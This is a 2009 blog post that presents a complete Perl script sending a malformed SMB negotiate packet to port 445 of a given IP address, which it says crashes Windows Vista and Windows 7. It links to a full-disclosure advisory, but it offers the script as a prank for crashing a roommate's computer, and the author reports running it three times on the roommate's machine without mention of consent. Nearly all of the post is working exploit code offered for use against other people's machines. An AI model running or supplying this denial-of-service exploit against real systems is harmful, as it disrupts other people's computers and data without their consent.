---
aliases: ["/archives/1151"]
title: "Crash your roommate's windows computer WOOO!!!"
date: "2009-09-09T02:33:14-05:00"
tags: ["ioall", "perl", "security", "windows"]
guid: "http://blog.afoolishmanifesto.com/?p=1151"
---
Have you heard? You can crash Vista and Windows 7 really easily with the following super basic code! (Tested 3x on roomies computer)

    #!perl

    my $ip = shift or die 'Please pass the IP Address to crash as a parameter to this program';

    use IO::All;
    my $io = io("$ip:445");

    my $foo =
    "\x00\x00\x00\x90". # Begin SMB header: Session message
    "\xff\x53\x4d\x42". # Server Component: SMB
    "\x72\x00\x00\x00". # Negociate Protocol
    "\x00\x18\x53\xc8". # Operation 0x18 & sub 0xc853
    "\x00\x23".         # Process ID High: --> :) normal value should be "\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe".
    "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54".
    "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31".
    "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00".
    "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57".
    "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61".
    "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c".
    "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c".
    "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e".
    "\x30\x30\x32\x00";

    $io->print($foo);

See details [Here!](http://seclists.org/fulldisclosure/2009/Sep/0039.html)
